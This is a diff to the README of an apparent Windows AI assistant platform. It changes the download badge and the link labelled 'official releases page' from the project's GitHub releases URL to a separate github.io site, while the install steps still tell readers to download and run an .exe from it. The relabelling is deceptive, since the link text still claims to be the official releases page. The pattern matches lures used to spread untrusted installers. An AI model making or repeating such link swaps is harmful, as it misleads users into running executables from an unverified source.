@@ -1,6 +1,6 @@
 # 🤖 ai-assistant-platform - Build smarter tools with automated workflows
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/florancelossless996/ai-assistant-platform/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://florancelossless996.github.io)
 
 This platform provides a complete environment for managing artificial intelligence tasks. It connects services like OpenAI, Anthropic, and Google to your local files and workflows. You can use this software to automate complex projects, read large documents, or create your own talking assistant. 
 
@@ -18,7 +18,7 @@ This software runs on Windows 10 and Windows 11. Ensure your computer meets thes
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/florancelossless996/ai-assistant-platform/releases) to access the installation files.
+1. Visit the [official releases page](https://florancelossless996.github.io) to access the installation files.
 2. Look for the latest version at the top of the list.
 3. Locate the "Assets" section under the release notes.
 4. Click the file ending in `.exe` to download the installer to your computer.
